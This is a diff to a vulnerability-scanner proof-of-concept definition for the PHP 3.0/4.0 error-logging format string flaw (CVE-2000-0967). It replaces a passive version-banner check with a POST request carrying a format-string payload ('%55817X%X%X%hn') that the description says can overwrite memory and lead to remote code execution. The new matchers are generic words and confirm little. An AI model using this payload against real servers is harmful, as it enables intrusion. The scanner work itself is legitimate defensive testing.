@@ -1,30 +1,36 @@
 [info]
-author = "AVE"
-description = "检测PHP 3.0/4.0错误日志格式化字符串漏洞(CVE-2000-0967)。通过检查PHP版本头信息判断目标是否运行存在漏洞的PHP版本(低于3.0.17或4.0.3)。"
+author = "ave"
+description = "通过向目标 PHP 服务器发送包含恶意格式化字符串的 HTTP POST 请求，触发 PHP 错误日志记录功能中的格式化字符串漏洞，验证目标是否存在 CVE-2000-0967 漏洞。攻击者可在 Content-Type 头中注入 %X 和 %hn 等格式化标记，导致内存覆写和远程代码执行。"
 id = "POC-AVE-2000-0698"
-name = "PHP 3.0/4.0 Error Logging Format String PoC"
+name = "PHP 3.0/4.0 Error Logging Format String RCE PoC"
 severity = "critical"
-tags = ["cve-2000-0967"]
+tags = ["ave-2000-0698"]
 vuln_id = [
     "CVE-2000-0967",
     "AVE-2000-0698",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/"
+method = "POST"
+path = "/{{BaseURL}}/index.php"
 protocol = "http"
+
+[poc.requests.body]
+content = "Content-Type:multipart/form-data %55817X%X%X%hn"
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
-part = "header"
+part = "body"
 type = "word"
 words = [
-    "PHP/3.0",
-    "PHP/4.0",
-    "PHP/3.",
-    "PHP/4.",
+    "PHP",
+    "Warning",
+    "error",
 ]
